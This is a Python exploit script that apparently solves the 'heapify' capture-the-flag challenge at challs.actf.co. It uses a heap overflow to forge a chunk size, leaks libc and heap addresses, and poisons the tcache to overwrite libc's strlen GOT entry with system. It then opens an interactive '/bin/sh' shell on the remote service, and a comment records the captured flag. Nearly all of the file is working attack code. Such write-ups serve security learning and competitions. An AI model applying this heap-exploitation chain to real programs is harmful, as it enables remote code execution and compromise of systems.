#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './heapify'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challs.actf.co', 'port':31501})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    h = Heapify(conn)

    h.alloc(0)

    h.alloc(0x18)   # 1
    h.alloc(0x18)   # 2
    h.alloc(0x3f8)  # 3
    h.alloc(0x18)

    h.delete(1)
    h.alloc(0x18, b'\x00'*0x18+p64(0x421))
    h.delete(2)
    h.alloc(0x18)   # 6

    addr_libc_mainarena = u(h.view(3)) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_got        = libc.sep_section['.got.plt']
    addr_libc_got_strlen = addr_libc_got + 0x98
    addr_libc_system     = libc.sep_function['system']

    h.alloc(0x28)   # 7
    h.alloc(0x28)   # 8
    h.delete(7)

    addr_heap_base = u(h.view(3)) << 12
    info('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))

    h.alloc(0x28)   # 9
    h.delete(8)
    h.delete(9)

    h.delete(6)
    h.alloc(0x18, b'\x00'*0x18+flat(0x31, (addr_libc_got_strlen-8) ^ (addr_heap_base >> 12)))
    h.alloc(0x28, b'/bin/sh') # 11

    h.alloc(0x28, flat(0xdeadbeef, addr_libc_system))

    h.view(11, False)

class Heapify:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def alloc(self, size, data = b''):
        self.sendlineafter(b'choice: ', b'1')
        self.sendlineafter(b'size: ', str(size).encode())
        self.sendlineafter(b'data: ', data)
        self.recvuntil(b'index: ')
        return int(self.recvline())

    def delete(self, idx):
        self.sendlineafter(b'choice: ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())

    def view(self, idx, wait=True):
        self.sendlineafter(b'choice: ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())
        return self.recvuntil(b'\nyour', drop=True) if wait else None

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # actf{wh3re_did_my_pr3c1ous_fr33_hook_go??}

if __name__=='__main__':
    main()

#==========
